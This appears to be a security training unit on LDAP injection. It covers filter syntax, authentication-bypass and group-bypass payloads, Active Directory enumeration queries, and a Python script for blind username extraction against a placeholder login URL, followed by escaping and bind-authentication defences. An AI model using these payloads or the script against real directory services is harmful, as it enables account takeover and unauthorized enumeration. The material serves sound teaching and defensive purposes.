# Unit 3: A03 - Injection — Topic 5: LDAP Injection

## Overview

LDAP (Lightweight Directory Access Protocol) injection occurs when user input is incorporated into **LDAP queries without proper sanitization**, allowing attackers to modify query logic. LDAP is widely used for authentication and user lookup in enterprise environments, particularly with **Active Directory**. Successful LDAP injection can lead to authentication bypass, information disclosure, and unauthorized access to directory data.

---

## 1. LDAP Basics for Security Testers

### LDAP Structure

```
┌─────────────────────────────────────────────────────────────────┐
│                    LDAP DIRECTORY TREE (DIT)                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  dc=example,dc=com                                             │
│  ├── ou=People                                                 │
│  │   ├── cn=John Smith                                         │
│  │   │   ├── uid: jsmith                                       │
│  │   │   ├── mail: jsmith@example.com                          │
│  │   │   ├── userPassword: {SSHA}hash...                       │
│  │   │   └── memberOf: cn=Admins,ou=Groups                    │
│  │   ├── cn=Jane Doe                                           │
│  │   │   ├── uid: jdoe                                         │
│  │   │   └── userPassword: {SSHA}hash...                       │
│  │   └── cn=Bob Wilson                                         │
│  ├── ou=Groups                                                 │
│  │   ├── cn=Admins                                             │
│  │   └── cn=Users                                              │
│  └── ou=Computers                                              │
└─────────────────────────────────────────────────────────────────┘
```

### LDAP Filter Syntax

| Filter | Meaning | Example |
|--------|---------|---------|
| `(uid=jsmith)` | Equality | Find user with uid "jsmith" |
| `(uid=j*)` | Wildcard | Find users starting with "j" |
| `(&(a)(b))` | AND | Both conditions true |
| `(\|(a)(b))` | OR | Either condition true |
| `(!(a))` | NOT | Negation |
| `(uid>=j)` | Greater/Equal | Lexicographic comparison |
| `(uid=*)` | Presence | Any value exists |

### Common LDAP Authentication Query

```
(&(uid=USER_INPUT)(userPassword=PASS_INPUT))

Normal: (&(uid=jsmith)(userPassword=secret123))
→ Returns jsmith if password matches
```

---

## 2. LDAP Injection Attacks

### Authentication Bypass

```
Vulnerable filter:
(&(uid=USER_INPUT)(userPassword=PASS_INPUT))

Attack 1: Wildcard in password
  User: jsmith
  Pass: *
  Filter: (&(uid=jsmith)(userPassword=*))
  → Password always matches (any value)!

Attack 2: Close parenthesis and comment
  User: jsmith)(&)
  Pass: anything
  Filter: (&(uid=jsmith)(&))(userPassword=anything))
  → The (&) is always true, rest is ignored

Attack 3: OR injection
  User: jsmith)(|(uid=*
  Pass: anything  
  Filter: (&(uid=jsmith)(|(uid=*))(userPassword=anything))
  → OR condition matches all users

Attack 4: Admin bypass
  User: admin)(&
  Pass: anything
  Filter: (&(uid=admin)(&)(userPassword=anything))
  → Always authenticates as admin
```

### Information Disclosure

```
# User lookup function
Vulnerable query: (uid=USER_INPUT)

# Extract all users
Input: *
Filter: (uid=*)
→ Returns all users in directory

# Extract users by pattern
Input: a*
Filter: (uid=a*)
→ Returns all users starting with 'a'

# Extract specific attributes
# If application displays results, enumerate:
Input: *)(objectClass=*
Filter: (uid=*)(objectClass=*)
→ Returns all objects with any class
```

---

## 3. Blind LDAP Injection

When the application doesn't return LDAP data directly:

```
┌──────────────────────────────────────────────────────────────┐
│                BLIND LDAP INJECTION                          │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Boolean-Based:                                              │
│  Test: admin)(uid=a* → Login success? First char = 'a'      │
│  Test: admin)(uid=b* → Login fail? First char ≠ 'b'         │
│                                                              │
│  Character-by-character extraction:                          │
│  admin)(uid=a*  → Success (starts with 'a')                 │
│  admin)(uid=ad* → Success (starts with 'ad')                │
│  admin)(uid=adm* → Success ('adm')                          │
│  admin)(uid=admi* → Success ('admi')                        │
│  admin)(uid=admin* → Success ('admin')                      │
│  admin)(uid=admin) → Success (exact match found!)           │
│                                                              │
│  This technique enumerates usernames, groups, attributes    │
└──────────────────────────────────────────────────────────────┘
```

### Automated Blind Extraction Script

```python
import requests
import string

TARGET = "http://target.com/login"

def test_filter(uid_payload, password="*"):
    resp = requests.post(TARGET, data={
        "username": uid_payload,
        "password": password
    })
    return "Welcome" in resp.text or resp.status_code == 200

def extract_usernames():
    """Extract all usernames via blind LDAP injection"""
    charset = string.ascii_lowercase + string.digits + "_.-"
    usernames = []
    
    # Find each username
    for prefix in charset:
        if test_filter(f"{prefix}*"):
            # Found a username starting with this char
            username = extract_full_value(prefix, charset)
            if username:
                usernames.append(username)
                print(f"[+] Found user: {username}")
    
    return usernames

def extract_full_value(known, charset):
    """Extract full value character by character"""
    while True:
        found_next = False
        for char in charset:
            if test_filter(f"{known}{char}*"):
                known += char
                found_next = True
                break
        
        if not found_next:
            # Verify exact match
            if test_filter(known):
                return known
            return None

users = extract_usernames()
print(f"\n[*] Found {len(users)} users: {users}")
```

---

## 4. Active Directory LDAP Attacks

### Common AD LDAP Queries Targeted

```
# User authentication
(&(sAMAccountName=USER)(userPassword=PASS))

# Group membership check
(&(sAMAccountName=USER)(memberOf=cn=Admins,ou=Groups,dc=corp,dc=com))

# User search
(sAMAccountName=USER_INPUT)

# Email lookup
(mail=EMAIL_INPUT)
```

### AD-Specific Injection Payloads

```
# Bypass admin group check
# Original: (&(sAMAccountName=user)(memberOf=cn=Admins...))
# Inject: user)(|(memberOf=*
# Result: (&(sAMAccountName=user)(|(memberOf=*)(memberOf=cn=Admins...)))
# → OR makes memberOf match everything

# Extract all domain users
(sAMAccountName=*)

# Find domain admins
(&(objectCategory=person)(memberOf=cn=Domain Admins,cn=Users,dc=corp,dc=com))

# Find computers
(objectCategory=computer)

# Find service accounts
(&(objectCategory=person)(servicePrincipalName=*))
```

---

## 5. LDAP Special Characters

| Character | LDAP Escape | Description |
|-----------|-------------|-------------|
| `*` | `\2a` | Wildcard |
| `(` | `\28` | Opening parenthesis |
| `)` | `\29` | Closing parenthesis |
| `\` | `\5c` | Backslash |
| `NUL` | `\00` | Null character |
| `/` | `\2f` | Forward slash |

---

## 6. Prevention and Remediation

### Secure LDAP Query Construction

```python
# ❌ VULNERABLE — String concatenation
def authenticate(username, password):
    filter = f"(&(uid={username})(userPassword={password}))"
    result = ldap_conn.search_s(base_dn, ldap.SCOPE_SUBTREE, filter)
    return len(result) > 0

# ✅ SECURE — Input sanitization + escaping
import ldap.filter

def authenticate(username, password):
    # Escape LDAP special characters
    safe_user = ldap.filter.escape_filter_chars(username)
    safe_pass = ldap.filter.escape_filter_chars(password)
    
    filter_str = f"(&(uid={safe_user})(userPassword={safe_pass}))"
    result = ldap_conn.search_s(base_dn, ldap.SCOPE_SUBTREE, filter_str)
    return len(result) > 0

# ✅ EVEN BETTER — Bind authentication (don't query passwords)
def authenticate(username, password):
    safe_user = ldap.filter.escape_filter_chars(username)
    
    # First find the user's DN
    result = ldap_conn.search_s(base_dn, ldap.SCOPE_SUBTREE, f"(uid={safe_user})")
    if not result:
        return False
    
    user_dn = result[0][0]
    
    # Then try to BIND as that user (LDAP handles password verification)
    try:
        test_conn = ldap.initialize(ldap_url)
        test_conn.simple_bind_s(user_dn, password)
        test_conn.unbind_s()
        return True
    except ldap.INVALID_CREDENTIALS:
        return False
```

```java
// ✅ SECURE — Java LDAP with proper escaping
import javax.naming.ldap.LdapName;

public boolean authenticate(String username, String password) {
    // Escape special LDAP characters
    String safeUser = escapeLdapFilter(username);
    
    String filter = "(&(uid=" + safeUser + "))";
    
    SearchControls controls = new SearchControls();
    controls.setSearchScope(SearchControls.SUBTREE_SCOPE);
    
    NamingEnumeration<SearchResult> results = ctx.search(baseDn, filter, controls);
    // Then use bind authentication for password verification
}

private String escapeLdapFilter(String input) {
    StringBuilder sb = new StringBuilder();
    for (char c : input.toCharArray()) {
        switch (c) {
            case '\\': sb.append("\\5c"); break;
            case '*':  sb.append("\\2a"); break;
            case '(':  sb.append("\\28"); break;
            case ')':  sb.append("\\29"); break;
            case '\0': sb.append("\\00"); break;
            default:   sb.append(c);
        }
    }
    return sb.toString();
}
```

### Prevention Checklist

| Control | Description |
|---------|-------------|
| **Escape special characters** | Use `ldap.filter.escape_filter_chars()` or equivalent |
| **Bind authentication** | Use LDAP bind instead of querying passwords |
| **Input validation** | Whitelist allowed characters for usernames |
| **Least privilege** | LDAP service account with read-only access |
| **Disable anonymous bind** | Require authentication for all LDAP queries |
| **Network segmentation** | LDAP servers not directly accessible from web |

---

## Summary Table

| Attack | Payload | Impact |
|--------|---------|--------|
| **Auth bypass (wildcard)** | Password: `*` | Login as any user |
| **Auth bypass (tautology)** | User: `admin)(&)` | Always-true condition |
| **User enumeration** | User: `*` or `a*` | Discover all accounts |
| **Blind extraction** | `admin)(uid=a*` | Character-by-character data extraction |
| **Group bypass** | `user)(\|(memberOf=*` | Bypass group membership checks |

---

## Revision Questions

1. How does LDAP filter syntax work? Explain AND, OR, NOT, and wildcard operations.
2. Demonstrate three different LDAP injection payloads that bypass authentication.
3. How does blind LDAP injection work? Write a script that extracts usernames character by character.
4. Why is LDAP bind authentication more secure than querying passwords in LDAP filters?
5. What are the LDAP special characters that must be escaped, and what are their escape sequences?
6. How would you test for LDAP injection in an Active Directory environment?

---

*Previous: [04-os-command-injection.md](04-os-command-injection.md) | Next: [06-prevention.md](06-prevention.md)*

---

*[Back to README](../README.md)*
